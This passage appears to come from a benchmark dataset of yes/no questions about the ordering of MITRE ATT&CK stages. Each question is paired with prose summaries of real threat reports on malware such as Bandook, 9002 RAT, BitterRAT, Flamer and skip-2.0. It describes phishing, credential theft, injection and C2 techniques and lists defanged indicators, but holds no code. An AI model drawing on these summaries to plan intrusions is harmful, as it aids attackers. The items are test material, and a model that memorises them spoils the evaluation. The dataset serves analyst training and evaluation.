Others: The main sample analyzed is a 32-bit executable with various hashes provided. The unpacked samples include a packed 'Benchmark' DLL, a monitor named PerfWatson.exe, and the NanoCore RAT dumped from memory. The 'Benchmark' .NET DLL is XOR encrypted and contains logic to unpack and inject the RAT, as well as monitor the application. The settings and NanoCore executable are serialized, DES encrypted, and stored across multiple PNG files as pixel data. A C# decompilation method is used to extract information from the pixel data. SentinelOne provides resources on how to protect against such attacks.",Yes,teaching-an-old-rat-new-tricks
268,134,134-Initial Access-T1190-Exploit Public-Facing Application,"After utilizing Microsoft Word documents to exploit CVE-2017-0199 for initial access, is it likely that the attack executed the embedded .hta file using mshta.exe before achieving persistence by scheduling a task named 'GoogleUpdateTasksMachineUI' to execute a VBS file every 3 minutes?","Initial Access: From April 19-24, 2017, a targeted campaign was carried out against Israeli organizations. The attack was delivered through compromised email accounts at Ben-Gurion University, using Microsoft Word documents that exploited the CVE-2017-0199 vulnerability to install a fileless variant of the Helminth Trojan agent. The Word document was sent as a reply to legitimate emails from those accounts and was propagated to more than 250 individuals in different Israeli companies.","Execution: The attack utilized a vulnerability exploit rather than macros. The .hta file delivered by the embedded link in the Word document was executed by mshta.exe, which typically shows a warning message. However, the attack disabled this message by sending an 'Enter' command to the warning window.
Persistence: The Helminth Trojan agent achieved persistence by adding a scheduled task named 'GoogleUpdateTasksMachineUI', which executes a VBS file every 3 minutes. The files are installed in the Public\Libraries\RecordedTV\ folder.
Defense Evasion: The Helminth Trojan agent used various evasive mechanisms, including the regeneration of its signatures on the infected computer to slow down detection and remediation. The attack also utilized a sophisticated version of the Mimikatz script to gather information while avoiding detection.
Credential Access: The bat script used in the attack is a customized version of Mimikatz, designed to gather information from the computer and the network. It includes commands to handle non-ASCII characters and validate the scheduled task added by the persistence mechanism.
Command and Control: The DnE1.Ps1 file communicates with a C&C server using DNS exchange queries, which is difficult to block. The server, vpsupdate[.]tk, was first registered on April 16, 2017. The script's goal is to download a bat script, execute it, and upload the results back to the C&C, clearing traces afterward.
Others: The C&C servers are still active and will be listed in the report. The attack is attributed to an Iranian hacker group responsible for the OilRig malware campaigns. The group is speculated to be sponsored by the Iranian government. The attack's sophistication has increased, with improvements in infrastructure, delivery servers, and the Helminth agent. The attackers set up the attack quickly, speculating that the window of opportunity between patch release and patch rollout was still open.",Yes,Iranian Fileless Attack Infiltrates Israeli Organizations
272,134,134-Command and Control-T1105-Ingress Tool Transfer,"After the Helminth Trojan agent uses a customized version of Mimikatz to gather information from the computer and the network, is it likely that the DnE1.Ps1 file will use DNS exchange queries to communicate with a C&C server and download a bat script for execution?","Command and Control: The DnE1.Ps1 file communicates with a C&C server using DNS exchange queries, which is difficult to block. The server, vpsupdate[.]tk, was first registered on April 16, 2017. The script's goal is to download a bat script, execute it, and upload the results back to the C&C, clearing traces afterward.","Initial Access: From April 19-24, 2017, a targeted campaign was carried out against Israeli organizations. The attack was delivered through compromised email accounts at Ben-Gurion University, using Microsoft Word documents that exploited the CVE-2017-0199 vulnerability to install a fileless variant of the Helminth Trojan agent. The Word document was sent as a reply to legitimate emails from those accounts and was propagated to more than 250 individuals in different Israeli companies.
Execution: The attack utilized a vulnerability exploit rather than macros. The .hta file delivered by the embedded link in the Word document was executed by mshta.exe, which typically shows a warning message. However, the attack disabled this message by sending an 'Enter' command to the warning window.
Persistence: The Helminth Trojan agent achieved persistence by adding a scheduled task named 'GoogleUpdateTasksMachineUI', which executes a VBS file every 3 minutes. The files are installed in the Public\Libraries\RecordedTV\ folder.
Defense Evasion: The Helminth Trojan agent used various evasive mechanisms, including the regeneration of its signatures on the infected computer to slow down detection and remediation. The attack also utilized a sophisticated version of the Mimikatz script to gather information while avoiding detection.
Credential Access: The bat script used in the attack is a customized version of Mimikatz, designed to gather information from the computer and the network. It includes commands to handle non-ASCII characters and validate the scheduled task added by the persistence mechanism.
Others: The C&C servers are still active and will be listed in the report. The attack is attributed to an Iranian hacker group responsible for the OilRig malware campaigns. The group is speculated to be sponsored by the Iranian government. The attack's sophistication has increased, with improvements in infrastructure, delivery servers, and the Helminth agent. The attackers set up the attack quickly, speculating that the window of opportunity between patch release and patch rollout was still open.",Yes,Iranian Fileless Attack Infiltrates Israeli Organizations
276,135,135-Execution-T1059-Command and Scripting Interpreter,"After delivering a malicious Microsoft Word document inside a ZIP file to achieve initial access, is it likely that the 'fmx.ps1' PowerShell script will decode and execute the base64 encoded script stored in 'sdmc.jpg' before the PowerShell script downloads a zip file containing components for the malware payload?","Execution: The execution phase involves the 'fmx.ps1' PowerShell script, which decodes and executes another base64 encoded PowerShell script stored in 'sdmc.jpg'. This script then downloads a zip file containing four files from a cloud service like Dropbox, Bitbucket, or an S3 bucket. The files 'a.png', 'b.png', and 'untitled.png' are used to generate the malware payload. 'untitled.png' contains a hidden RC4 function encoded in the pixels, created using invoke-PSImage. The final executable payload is assembled from decrypted 'a.png' and 'b.png' as is. The PowerShell script then executes the malware, opens 'draft.docx' (a benign document to mislead the victim), and cleans up the artifacts.","Initial Access: The initial access in the Bandook campaign begins with a malicious Microsoft Word document delivered inside a ZIP file. This document contains encrypted script data and an external template that points to another document with malicious VBA macros. The external template is downloaded via URL shortening services like TinyURL or Bitly, which then redirects to a domain controlled by the attacker. The VBA code within the external template decrypts the embedded data from the original document and drops it into two files: 'fmx.ps1' (PowerShell script) and 'sdmc.jpg' (base64 encoded PowerShell code). The themes of the lure documents often relate to cloud-based services such as Office365, OneDrive, and Azure, with images suggesting additional documents are available upon enabling macros. One document even depicted an Office365 logo and a preview of a certificate issued by the government of Dubai, specifically mentioning JAFZA - Jebel Ali Free Zone.
Defense Evasion: The Bandook campaign employs various techniques to hinder analysis and detection. The attackers switch the malicious external template to a benign one after a certain amount of time. The malware payload is generated using image files to conceal its components, and the final Bandook payload is signed with valid certificates from Certum to appear trustworthy.
Command and Control: The Bandook loader, written in Delphi, uses the Process Hollowing technique to inject a malicious payload into a new instance of an Internet Explorer process. The payload then contacts the C&C server, sends basic information about the infected machine, and awaits further commands. The communication protocol with the C&C server has been upgraded to use AES encryption.
Others: The Bandook malware has a history dating back to 2007 and was developed by an individual nicknamed PrinceAli. Over time, the malware became publicly available for download. The variant used in the recent attacks is a slimmed-down version with only 11 supported commands, including file operations, taking screenshots, and file download/upload/execution. The campaign targets a wide range of sectors and locations, suggesting that the malware is part of an offensive infrastructure sold to governments and threat actors worldwide. The campaign shares similarities with previous campaigns attributed to the Lebanese General Security Directorate, known as 'Dark Caracal'. The operators behind the infrastructure of 'Operation Manul' and 'Dark Caracal' are believed to still be active and operational.",Yes,Bandook_ Signed & Delivered - Check Point Research
280,135,135-Command and Control-T1573-Encrypted Channel,"After employing image files to conceal malicious components during the Defense Evasion phase, is the Bandook campaign likely to use the Process Hollowing technique within Internet Explorer to inject a malicious payload before employing AES encryption for communication with the C&C server?","Command and Control: The Bandook loader, written in Delphi, uses the Process Hollowing technique to inject a malicious payload into a new instance of an Internet Explorer process. The payload then contacts the C&C server, sends basic information about the infected machine, and awaits further commands. The communication protocol with the C&C server has been upgraded to use AES encryption.","Initial Access: The initial access in the Bandook campaign begins with a malicious Microsoft Word document delivered inside a ZIP file. This document contains encrypted script data and an external template that points to another document with malicious VBA macros. The external template is downloaded via URL shortening services like TinyURL or Bitly, which then redirects to a domain controlled by the attacker. The VBA code within the external template decrypts the embedded data from the original document and drops it into two files: 'fmx.ps1' (PowerShell script) and 'sdmc.jpg' (base64 encoded PowerShell code). The themes of the lure documents often relate to cloud-based services such as Office365, OneDrive, and Azure, with images suggesting additional documents are available upon enabling macros. One document even depicted an Office365 logo and a preview of a certificate issued by the government of Dubai, specifically mentioning JAFZA - Jebel Ali Free Zone.
Execution: The execution phase involves the 'fmx.ps1' PowerShell script, which decodes and executes another base64 encoded PowerShell script stored in 'sdmc.jpg'. This script then downloads a zip file containing four files from a cloud service like Dropbox, Bitbucket, or an S3 bucket. The files 'a.png', 'b.png', and 'untitled.png' are used to generate the malware payload. 'untitled.png' contains a hidden RC4 function encoded in the pixels, created using invoke-PSImage. The final executable payload is assembled from decrypted 'a.png' and 'b.png' as is. The PowerShell script then executes the malware, opens 'draft.docx' (a benign document to mislead the victim), and cleans up the artifacts.
Defense Evasion: The Bandook campaign employs various techniques to hinder analysis and detection. The attackers switch the malicious external template to a benign one after a certain amount of time. The malware payload is generated using image files to conceal its components, and the final Bandook payload is signed with valid certificates from Certum to appear trustworthy.
Others: The Bandook malware has a history dating back to 2007 and was developed by an individual nicknamed PrinceAli. Over time, the malware became publicly available for download. The variant used in the recent attacks is a slimmed-down version with only 11 supported commands, including file operations, taking screenshots, and file download/upload/execution. The campaign targets a wide range of sectors and locations, suggesting that the malware is part of an offensive infrastructure sold to governments and threat actors worldwide. The campaign shares similarities with previous campaigns attributed to the Lebanese General Security Directorate, known as 'Dark Caracal'. The operators behind the infrastructure of 'Operation Manul' and 'Dark Caracal' are believed to still be active and operational.",Yes,Bandook_ Signed & Delivered - Check Point Research
284,136,136-Defense Evasion-T1027-Obfuscated Files or Information,"After employing spear-phishing and watering hole attacks to gain initial access, is it likely that the Dropping Elephant threat actor will use UPX-packed backdoor malware to download additional malicious artifacts before evading detection by decoding the encoded blobs?","Defense Evasion: The backdoor downloads encoded blobs that are decoded to PowerShell command line scripts, which are then executed to download additional malware. This method of using encoded blobs helps evade detection.","Reconnaissance: The Dropping Elephant threat actor, also known as Chinastrats and Patchwork, has been observed targeting high-profile diplomatic and economic entities with a focus on China's foreign relations. The adversaries employ spear-phishing and watering hole attacks to gather information and compromise victims.
Initial Access: Dropping Elephant uses spear-phishing with documents containing remote content that sends a 'ping' to the attackers' server upon opening. A subsequent spear-phishing email with an MS Word document exploiting CVE-2012-0158 or a PowerPoint document exploiting CVE-2014-6352 is sent. They also use watering hole attacks with a website that downloads genuine news articles and requires downloading a PowerPoint document to view the entire article, which contains a malicious artifact.
Execution: The backdoor used by Dropping Elephant is UPX packed and downloads additional malware from the C2 server, including encoded blobs that are decoded to PowerShell command line scripts.
Credential Access: The backdoor steals the user's Google Chrome credentials among other data.
Collection: The file-stealer module iterates through directories to collect files with specific extensions (doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, pdf) and uploads them to the C2 server.
Command and Control: The backdoor pings the C2 server at regular intervals, which can be spotted by analyzing firewall log files. The group also uses resilient communications, hiding encrypted C2 server locations in comments on legitimate websites.
Others: The Dropping Elephant artifacts are detected by Kaspersky Lab products under various signatures. Kaspersky Lab collaborates with CERTs and LEAs to notify victims and mitigate the threat. Indicators of Compromise (IoCs) include a list of backdoors, exploit documents, domains, IPs, and C2 redirectors.",Yes,The Dropping Elephant actor - Securelist
287,136,136-Command and Control-T1071-Application Layer Protocol,"After the backdoor steals Google Chrome credentials, is it likely that it will ping the C2 server at regular intervals before collecting and uploading targeted file types, such as doc, docx, and pdf, to the same server?","Command and Control: The backdoor pings the C2 server at regular intervals, which can be spotted by analyzing firewall log files. The group also uses resilient communications, hiding encrypted C2 server locations in comments on legitimate websites.","Reconnaissance: The Dropping Elephant threat actor, also known as Chinastrats and Patchwork, has been observed targeting high-profile diplomatic and economic entities with a focus on China's foreign relations. The adversaries employ spear-phishing and watering hole attacks to gather information and compromise victims.
Initial Access: Dropping Elephant uses spear-phishing with documents containing remote content that sends a 'ping' to the attackers' server upon opening. A subsequent spear-phishing email with an MS Word document exploiting CVE-2012-0158 or a PowerPoint document exploiting CVE-2014-6352 is sent. They also use watering hole attacks with a website that downloads genuine news articles and requires downloading a PowerPoint document to view the entire article, which contains a malicious artifact.
Execution: The backdoor used by Dropping Elephant is UPX packed and downloads additional malware from the C2 server, including encoded blobs that are decoded to PowerShell command line scripts.
Defense Evasion: The backdoor downloads encoded blobs that are decoded to PowerShell command line scripts, which are then executed to download additional malware. This method of using encoded blobs helps evade detection.
Credential Access: The backdoor steals the user's Google Chrome credentials among other data.
Collection: The file-stealer module iterates through directories to collect files with specific extensions (doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, pdf) and uploads them to the C2 server.
Others: The Dropping Elephant artifacts are detected by Kaspersky Lab products under various signatures. Kaspersky Lab collaborates with CERTs and LEAs to notify victims and mitigate the threat. Indicators of Compromise (IoCs) include a list of backdoors, exploit documents, domains, IPs, and C2 redirectors.",Yes,The Dropping Elephant actor - Securelist
288,136,136-Reconnaissance-T1589-Gather Victim Identity Information,"After targeting diplomatic and economic entities to gather victim identity information, is it likely that Dropping Elephant will use spear-phishing emails containing malicious documents to gain initial access before executing UPX-packed backdoors to download additional malware?","Reconnaissance: The Dropping Elephant threat actor, also known as Chinastrats and Patchwork, has been observed targeting high-profile diplomatic and economic entities with a focus on China's foreign relations. The adversaries employ spear-phishing and watering hole attacks to gather information and compromise victims.","Initial Access: Dropping Elephant uses spear-phishing with documents containing remote content that sends a 'ping' to the attackers' server upon opening. A subsequent spear-phishing email with an MS Word document exploiting CVE-2012-0158 or a PowerPoint document exploiting CVE-2014-6352 is sent. They also use watering hole attacks with a website that downloads genuine news articles and requires downloading a PowerPoint document to view the entire article, which contains a malicious artifact.
Execution: The backdoor used by Dropping Elephant is UPX packed and downloads additional malware from the C2 server, including encoded blobs that are decoded to PowerShell command line scripts.
Defense Evasion: The backdoor downloads encoded blobs that are decoded to PowerShell command line scripts, which are then executed to download additional malware. This method of using encoded blobs helps evade detection.
Credential Access: The backdoor steals the user's Google Chrome credentials among other data.
Collection: The file-stealer module iterates through directories to collect files with specific extensions (doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, pdf) and uploads them to the C2 server.
Command and Control: The backdoor pings the C2 server at regular intervals, which can be spotted by analyzing firewall log files. The group also uses resilient communications, hiding encrypted C2 server locations in comments on legitimate websites.
Others: The Dropping Elephant artifacts are detected by Kaspersky Lab products under various signatures. Kaspersky Lab collaborates with CERTs and LEAs to notify victims and mitigate the threat. Indicators of Compromise (IoCs) include a list of backdoors, exploit documents, domains, IPs, and C2 redirectors.",Yes,The Dropping Elephant actor - Securelist
289,136,136-Credential Access-T1555-Credentials from Password Stores,"After evading defenses by decoding encoded blobs into PowerShell command line scripts to download additional malware, is the Dropping Elephant backdoor likely to iterate through password stores and steal the user's Google Chrome credentials?",Credential Access: The backdoor steals the user's Google Chrome credentials among other data.,"Reconnaissance: The Dropping Elephant threat actor, also known as Chinastrats and Patchwork, has been observed targeting high-profile diplomatic and economic entities with a focus on China's foreign relations. The adversaries employ spear-phishing and watering hole attacks to gather information and compromise victims.
Initial Access: Dropping Elephant uses spear-phishing with documents containing remote content that sends a 'ping' to the attackers' server upon opening. A subsequent spear-phishing email with an MS Word document exploiting CVE-2012-0158 or a PowerPoint document exploiting CVE-2014-6352 is sent. They also use watering hole attacks with a website that downloads genuine news articles and requires downloading a PowerPoint document to view the entire article, which contains a malicious artifact.
Execution: The backdoor used by Dropping Elephant is UPX packed and downloads additional malware from the C2 server, including encoded blobs that are decoded to PowerShell command line scripts.
Defense Evasion: The backdoor downloads encoded blobs that are decoded to PowerShell command line scripts, which are then executed to download additional malware. This method of using encoded blobs helps evade detection.
Collection: The file-stealer module iterates through directories to collect files with specific extensions (doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, pdf) and uploads them to the C2 server.
Command and Control: The backdoor pings the C2 server at regular intervals, which can be spotted by analyzing firewall log files. The group also uses resilient communications, hiding encrypted C2 server locations in comments on legitimate websites.
Others: The Dropping Elephant artifacts are detected by Kaspersky Lab products under various signatures. Kaspersky Lab collaborates with CERTs and LEAs to notify victims and mitigate the threat. Indicators of Compromise (IoCs) include a list of backdoors, exploit documents, domains, IPs, and C2 redirectors.",Yes,The Dropping Elephant actor - Securelist
290,136,136-Collection-T1119-Automated Collection,"After the backdoor used by Dropping Elephant downloads encoded blobs that are decoded to PowerShell command line scripts for defense evasion, is it likely that the file-stealer module will iterate through directories to collect files with specific extensions for automated collection?","Collection: The file-stealer module iterates through directories to collect files with specific extensions (doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, pdf) and uploads them to the C2 server.","Reconnaissance: The Dropping Elephant threat actor, also known as Chinastrats and Patchwork, has been observed targeting high-profile diplomatic and economic entities with a focus on China's foreign relations. The adversaries employ spear-phishing and watering hole attacks to gather information and compromise victims.
Initial Access: Dropping Elephant uses spear-phishing with documents containing remote content that sends a 'ping' to the attackers' server upon opening. A subsequent spear-phishing email with an MS Word document exploiting CVE-2012-0158 or a PowerPoint document exploiting CVE-2014-6352 is sent. They also use watering hole attacks with a website that downloads genuine news articles and requires downloading a PowerPoint document to view the entire article, which contains a malicious artifact.
Execution: The backdoor used by Dropping Elephant is UPX packed and downloads additional malware from the C2 server, including encoded blobs that are decoded to PowerShell command line scripts.
Defense Evasion: The backdoor downloads encoded blobs that are decoded to PowerShell command line scripts, which are then executed to download additional malware. This method of using encoded blobs helps evade detection.
Credential Access: The backdoor steals the user's Google Chrome credentials among other data.
Command and Control: The backdoor pings the C2 server at regular intervals, which can be spotted by analyzing firewall log files. The group also uses resilient communications, hiding encrypted C2 server locations in comments on legitimate websites.
Others: The Dropping Elephant artifacts are detected by Kaspersky Lab products under various signatures. Kaspersky Lab collaborates with CERTs and LEAs to notify victims and mitigate the threat. Indicators of Compromise (IoCs) include a list of backdoors, exploit documents, domains, IPs, and C2 redirectors.",Yes,The Dropping Elephant actor - Securelist
291,136,136-Collection-T1074-Data Staged,"After the backdoor used by Dropping Elephant steals the user's Google Chrome credentials and other data, is it likely that the file-stealer module will iterate through directories to collect files with specific extensions and upload them to the C2 server?","Collection: The file-stealer module iterates through directories to collect files with specific extensions (doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, pdf) and uploads them to the C2 server.","Reconnaissance: The Dropping Elephant threat actor, also known as Chinastrats and Patchwork, has been observed targeting high-profile diplomatic and economic entities with a focus on China's foreign relations. The adversaries employ spear-phishing and watering hole attacks to gather information and compromise victims.
Initial Access: Dropping Elephant uses spear-phishing with documents containing remote content that sends a 'ping' to the attackers' server upon opening. A subsequent spear-phishing email with an MS Word document exploiting CVE-2012-0158 or a PowerPoint document exploiting CVE-2014-6352 is sent. They also use watering hole attacks with a website that downloads genuine news articles and requires downloading a PowerPoint document to view the entire article, which contains a malicious artifact.
Execution: The backdoor used by Dropping Elephant is UPX packed and downloads additional malware from the C2 server, including encoded blobs that are decoded to PowerShell command line scripts.
Defense Evasion: The backdoor downloads encoded blobs that are decoded to PowerShell command line scripts, which are then executed to download additional malware. This method of using encoded blobs helps evade detection.
Credential Access: The backdoor steals the user's Google Chrome credentials among other data.
Command and Control: The backdoor pings the C2 server at regular intervals, which can be spotted by analyzing firewall log files. The group also uses resilient communications, hiding encrypted C2 server locations in comments on legitimate websites.
Others: The Dropping Elephant artifacts are detected by Kaspersky Lab products under various signatures. Kaspersky Lab collaborates with CERTs and LEAs to notify victims and mitigate the threat. Indicators of Compromise (IoCs) include a list of backdoors, exploit documents, domains, IPs, and C2 redirectors.",Yes,The Dropping Elephant actor - Securelist
302,139,139-Command and Control-T1071-Application Layer Protocol,"After using Windows Management Instrumentation (WMI) to register a script as a backdoor for persistence and to avoid detection through file scanning by antivirus solutions for defense evasion, is the Luckycat campaign likely to utilize free hosting services and communicate with C&C servers using HTTP over port 80 for command-and-control operations?","Command and Control: The Luckycat campaign extensively used free hosting services for command-and-control (C&C) operations, with domains registered using diverse email addresses. The attackers also maintained servers on dedicated VPS services, providing a resilient infrastructure. The malware communicated with the C&C servers using HTTP over port 80, posting data to a PHP script, usually count.php, and executing commands received from the attackers.","Initial Access: The Luckycat campaign, active since at least June 2011, targeted a variety of entities in Japan, India, and Tibetan activists. The attackers employed social engineering tactics, sending contextually relevant emails with malicious attachments that exploited vulnerabilities in popular software such as Adobe Reader and Microsoft Office. Notably, CVE-2010-3333, known as the 'Rich Text Format Stack Buffer Overflow Vulnerability', was frequently exploited. The malware used, identified as TROJ_WIMMIE or VBS_WIMMIE, leveraged Windows Management Instrumentation (WMI) for persistence and communicated with command-and-control (C&C) servers via HTTP over port 80. The attackers utilized free web-hosting services for diverse domain names but also employed Virtual Private Servers (VPSs) for more stable operations.
Persistence: The Luckycat malware, specifically TROJ_WIMMIE and VBS_WIMMIE, established persistence by using Windows Management Instrumentation (WMI) to register a script that acted as a backdoor and was undetectable through file scanning. The malware connected to a C&C server and posted data to a PHP script, usually count.php, which resulted in the creation of a file on the C&C server containing information about the compromised computer.
Defense Evasion: The Luckycat malware, TROJ_WIMMIE and VBS_WIMMIE, evaded detection by leveraging Windows Management Instrumentation (WMI) to avoid simple file scanning by antivirus software. The attackers also used proxy and anonymity tools to shield their identities and a variety of mailing programs to instigate targeted attacks.
Others: The Luckycat campaign was linked to other campaigns, including ShadowNet, Duojeen, Sparksrv, and Comfoo, indicating possible collaboration or shared infrastructure. The attackers tested their malware in a virtual environment using a Chinese-language version of Windows XP. They also used anonymity tools like Tor and Tunnelier to obscure their locations and mailing software such as FoxMail and Supermailer for sending socially engineered emails. The campaign was connected to a hacker in the Chinese underground community, known by the nicknames 'dang0102' and 'scuhkr', who had ties to the Information Security Institute of Sichuan University.",Yes,wp_luckycat_redux
305,14,14-Command and Control-T1071-Application Layer Protocol,Is it likely that the Russian-language phishing campaign exploited a vulnerability in Microsoft's Encapsulated Postscript (EPS) filter through malicious docx files containing obfuscated code before the malware established communication with a compromised server located at IP address 137.74.224[.]142 for command and control?,"Command and Control: The malware communicated with a compromised server at IP address 137.74.224[.]142, which was previously associated with a Minecraft server. The server responded with HTTP 200 and the message 'False'. The communication occurred at five-second intervals, and the server's historic DNS resolutions were examined for potential associations with previous campaigns.","Initial Access: A Russian-language phishing campaign was active during the second week of August 2017, targeting Russian banks with emails that appeared to be from disgruntled customers complaining about extra charges. The emails contained malicious attachments exploiting a vulnerability in Microsoft's Encapsulated Postscript (EPS) filter, likely CVE-2017-0262, which had been patched in April 2017. The campaign involved at least 23 attachments with names such as 'Account statement', 'Card statement', and 'Personal information'. The attachments were nearly identical, with variations in checksums possibly intended to generate unique hashes. The exploit was delivered via docx files containing an embedded EPS image file, which included obfuscated code and a multibyte XOR key. The attackers signed their malware with lyrics from Slipknot's 'Snuff' and included obfuscated comments possibly targeting Kaspersky. The campaign was brought to the attention of the Central Bank of Russia's FinCERT by one or more targeted banks.",Yes,Russian-Bank-Offices
308,140,140-Command and Control-T1090-Proxy,"After maintaining persistence through a .LNK file in the Startup directory that executes a PowerShell script to inject the downloaded 9002 RAT shellcode into a new wabmig.exe process, is the 9002 RAT likely to use fake SSL communication for Command and Control to mimic legitimate traffic to login.live[.]com?","Command and Control: The 9002 RAT communicates with its C&C using HTTP POST requests with encoded data. The encoding algorithm is an iteration of the ""4-byte XOR version of 9002"" analyzed by FireEye. The malware uses a dynamic 4-byte XOR key along with a static 38-byte seed to generate a final 256-byte XOR key. The HTTP POST requests contain hardcoded Accept and User-Agent headers, and two different hardcoded URIs are used for communication. The RAT also uses fake SSL communication, attempting to mimic legitimate SSL traffic to login.live[.]com.","Initial Access: Proofpoint detected malicious email messages on August 10, which were designed to appear as if they contained unreleased Game of Thrones content. The emails used the subject line ""Wanna see the Game of Thrones in advance?"" and included a Microsoft Word attachment named ""game of thrones preview.docx"". This document contained an embedded .LNK object that, if executed, would run a malicious PowerShell script leading to the installation of the ""9002"" RAT.
Execution: The .LNK object in the malicious email attachment executes a PowerShell command using a modified Invoke-Shellcode script to download two files obfuscated with XOR and base64. The first file contains the 9002 RAT shellcode that is injected into the legitimate Windows Mail binary wabmig.exe. The second file is a .LNK file used to maintain persistence on the infected machine. The persistence .LNK is stored in the Startup directory as UpdateCheck.lnk and contains a PowerShell script nearly identical to the .LNK downloader, but instead of downloading shellcode, it opens, decodes, and injects the already downloaded shellcode into a newly created wabmig.exe process.
Persistence: The persistence mechanism involves a .LNK file named UpdateCheck.lnk, which is stored in the Startup directory. This file contains a PowerShell script that decodes and injects the downloaded 9002 RAT shellcode into a newly created wabmig.exe process, ensuring the RAT remains active even after system restarts.
Defense Evasion: The 9002 RAT variant used in the attack is capable of communicating over HTTP and fake SSL, with hardcoded packets for Client_Hello and Client_Key_Exchange. The HTTP traffic and encoding used by this variant have several distinguishing characteristics, including data sent to the C&C in an encoded state using a custom algorithm followed by base64-encoding. The malware also attempts to mimic SSL traffic to login.live[.]com by sending that domain in the SNI field. Additionally, if the same URI is requested with any User-Agent, a legitimate JPG is returned instead of the payload, indicating an evasion technique to avoid detection by automated systems.
Others: The campaign was attributed to a state-sponsored actor, possibly the Chinese government, based on similarities with previous attacks such as Operation Aurora and Operation Ephemeral Hydra. The 9002 RAT has been historically used by these actors, and the current campaign's use of a Game of Thrones lure is consistent with the tactic of using timely and relevant lures. The attack was blocked by Proofpoint systems, but the sophistication of the delivery mechanisms and the RAT itself pose significant threats to corporate data and systems. The campaign may be connected to the Deputy Dog (APT17) actor, based on shared identifiers and similarities in code, payload, file names, images, and themes. The earliest use of the malicious LNK PowerShell downloader was identified in a file uploaded to a malicious file scanning service on July 6, 2017.",Yes,operation-rat-cook-chinese-apt-actors-use-fake-game-thrones-leaks-lures
312,141,141-Initial Access-T1566-Phishing,"After the BitterAPT group developed BitterRAT malware, is it likely that they utilized compromised websites and phishing schemes to distribute their threats before setting up Command and Control servers such as blitzchatlog.ddns.net for victim communication and data exfiltration?","Initial Access: The BitterAPT group, also known as APT-C-08, has been active since at least 2014, targeting Pakistani nationals and later expanding to China, India, and other South Asian countries, as well as Saudi Arabia. Initially, BitterAPT used the AndroRAT framework for their Android malware but later developed a custom RAT known as BitterRAT. They distributed their malware through fake applications and compromised websites, such as gandharaart[.]org, which hosted both Windows and Android versions of their threats. The group has been known to use phishing schemes and hacked sites for distribution, including spiceworld.rf[.]gd, which delivered P-Hub Premium.apk. The BitterAPT group is believed to operate out of South Asia, with activity patterns suggesting a regular workweek schedule.","Command and Control: The BitterAPT group utilized several Command and Control (CnC) servers to communicate with compromised systems. New domains were discovered, including blitzchatlog.ddns.net, playupdateapp.serveblog.net, and techfront.com.cn, which were used to exfiltrate personal data. The domain blitzchatlog.ddns.net, hosted by Leaseweb in the US, served as a resource for some applications and contained various .php files for different data services. The CnCs tracked victims using phone IMEI and SIM numbers.
Others: The BitterAPT group infiltrated Google Play with applications such as AlarmClockSlide, which shared the same package name and certificate as known BitterRAT malware. Other applications by the same developer, CreativeFox, were found on Google Play without data-exfiltration capabilities but could potentially be weaponized through updates. The applications' privacy pages pointed to the domain thew64binautoclean[.]org, which was developed with significant effort. Indicators suggest that the applications were designed to target Pakistani victims. BitterRAT has evolved to include modules for spying and stealing personal information, with capabilities to record calls, access call history, SMS, location, accounts, installed applications, documents, WhatsApp messages, and BBM messages. The malware also collects network details, IMEI, phone numbers, roaming status, and voice mail numbers. Some BitterRAT samples retrieve the CnC from a Firebase database due to improper configuration, revealing the domain flashnewsservice.org. The BitterAPT group's telemetry indicates a focus on Asian countries, with most scans coming from China, Hong Kong, and Singapore.",Yes,Bitdefender-PR-Whitepaper-BitterAPT-creat4571-en-EN-GenericUse
318,142,142-Collection-T1560-Archive Collected Data,"After W32.Flamer disables unnecessary logging and securely deletes log files for defense evasion, is it likely that it will archive collected data by encrypting it with a public key before uploading it to the C&C servers?","Collection: The W32.Flamer malware collected data from compromised systems, which was then uploaded to the C&C servers. The data was encrypted with a public key, requiring a corresponding private key to decrypt, which was not available to the operators.","Initial Access: The W32.Flamer malware utilized a novel man-in-the-middle attack against Windows Update to spread across networks and gain initial access to systems.
Defense Evasion: The attackers behind W32.Flamer took steps to avoid detection and hamper investigations by disabling unnecessary logging and securely deleting log files regularly. They also configured the C&C servers to record minimal information.
Command and Control: The C&C servers for W32.Flamer were managed through a Web application called Newsforyou, which processed client interactions and provided a control panel for attackers to upload code packages and download stolen data. The application was designed to communicate with clients compromised by malware other than Flamer, indicating a framework supporting different malware campaigns.
Exfiltration: Compromised clients uploaded stolen data to the C&C servers, which was then archived and could be downloaded by the operators. The data was encrypted, preventing unauthorized access even if the C&C server was infiltrated.
Impact: One of the C&C servers delivered a module instructing W32.Flamer to self-destruct and remove all traces of the malware from compromised systems in late May 2012.
Others: The forensic analysis of the W32.Flamer C&C servers revealed that the servers were operational since at least 2012, with the first server set up on May 18, 2012, and the second on March 25, 2012. The analysis also uncovered the nicknames of four authors who worked on the code, indicating a collaborative and ongoing development effort. The C&C servers were part of a sophisticated cyber espionage campaign targeting the Middle East, with the malware being modular in design and containing novel functionality. The attackers employed data security compartmentalization techniques, indicating a highly organized and sophisticated group behind the operation. The investigation provided insights into the architecture of the threat and the command structure of the entities behind it, suggesting the involvement of a large and well-funded entity.",Yes,w32_flamer_newsforyou
330,144,144-Defense Evasion-T1574-Hijack Execution Flow,"After the skip-2.0 backdoor achieves persistence by exploiting a DLL hijacking vulnerability to load at system startup via the Windows SessionEnv service, is it likely to employ multiple hooks in the sqllang.dll service to bypass authentication and evade defenses before its Inner-Loader component performs process discovery targeting MSSQL Server?","Defense Evasion: The skip-2.0 backdoor employs multiple hooks in the sqllang.dll service to bypass authentication and maintain stealth, effectively blocking event logging. It also uses Winnti's custom packer for software packing, and the launcher is VMProtected, which contributes to its evasion capabilities.","Execution: The Winnti Group has been observed using a backdoor targeting Microsoft SQL Server, known as skip-2.0, which is launched via a VMProtected launcher. This launcher is typically associated with payloads such as PortReuse or ShadowPad. The skip-2.0 backdoor is executed with the SessionEnv service and is likely to use a DLL hijacking technique against this service for persistence.
Persistence: The skip-2.0 backdoor likely achieves persistence by exploiting a DLL hijacking vulnerability, being installed at C:\Windows\System32\TSVIPSrv.DLL, which results in the DLL being loaded by the standard Windows SessionEnv service at system startup.
Discovery: The Inner-Loader component of the skip-2.0 backdoor lists running processes to find the process running MSSQL Server, indicating a process discovery technique.
